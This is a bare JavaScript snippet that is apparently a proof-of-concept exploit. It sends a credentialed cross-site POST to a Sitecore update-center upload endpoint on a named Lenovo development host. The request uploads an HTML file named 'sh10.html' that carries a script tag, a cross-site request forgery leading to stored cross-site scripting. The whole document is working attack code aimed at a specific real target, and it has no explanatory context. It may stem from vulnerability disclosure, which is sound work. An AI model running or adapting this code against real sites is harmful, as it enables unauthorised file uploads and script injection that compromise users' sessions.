
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/cm.dxp-dev.lenovo.com\/sitecore\/api\/ssc\/updatecenter\/upload\/-\/upload?sc_site=shell", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
        xhr.setRequestHeader("Accept-Language", "uk-UA,uk;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------99507141219078795311499387167");
        xhr.withCredentials = true;
        var body = "-----------------------------99507141219078795311499387167\r\n" + 
          "Content-Disposition: form-data; name=\"uploadFile\"; filename=\"sh10.html\"\r\n" + 
          "Content-Type: text/html\r\n" + 
          "\r\n" + 
          "\x3cscript\x3ealert(1)\x3c/script\x3e\r\n" + 
          "-----------------------------99507141219078795311499387167--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
     
